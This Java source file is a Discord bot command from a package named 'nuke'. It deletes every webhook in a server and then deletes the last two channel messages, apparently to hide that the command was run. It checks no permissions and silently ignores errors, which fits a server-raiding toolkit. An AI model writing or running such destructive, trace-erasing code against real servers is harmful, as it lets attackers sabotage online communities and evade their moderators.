package me.comu.exeter.commands.nuke;

import me.comu.exeter.core.Core;
import me.comu.exeter.interfaces.ICommand;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.Webhook;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
import net.dv8tion.jda.api.exceptions.ErrorResponseException;
import net.dv8tion.jda.api.exceptions.HierarchyException;

import java.util.Arrays;
import java.util.List;
import java.util.Random;

public class DeleteWebhooksCommand implements ICommand {
    @Override
    public void handle(List<String> args, GuildMessageReceivedEvent event) {
        List<Webhook> webhooks = event.getGuild().retrieveWebhooks().complete();
        int tcSize = webhooks.size();
            try {
                for (int i = 0; i <= tcSize ; i++) {
                    try {
                        webhooks.get(i).delete().complete();
                    } catch (HierarchyException | IndexOutOfBoundsException ex1) {
                    }
                }
            } catch(HierarchyException | ErrorResponseException | IndexOutOfBoundsException ex) {

            }
            List<Message> messages = event.getChannel().getHistory().retrievePast(2).complete();
            event.getChannel().deleteMessages(messages).queue();


    }
    private int getRandom() {
        Random randy = new Random();
        return randy.nextInt();
    }
    @Override
    public String getHelp() {
        return "Deletes all webhooks\n`" + Core.PREFIX + getInvoke() + "`\nAliases: " + Arrays.deepToString(getAlias()) + "`";
    }

    @Override
    public String getInvoke() {
        return "delwebhooks";
    }

    @Override
    public String[] getAlias() {
        return new String[] {"dweb","deleteweb","deletebhooks","deletewebhook"};
    }
}
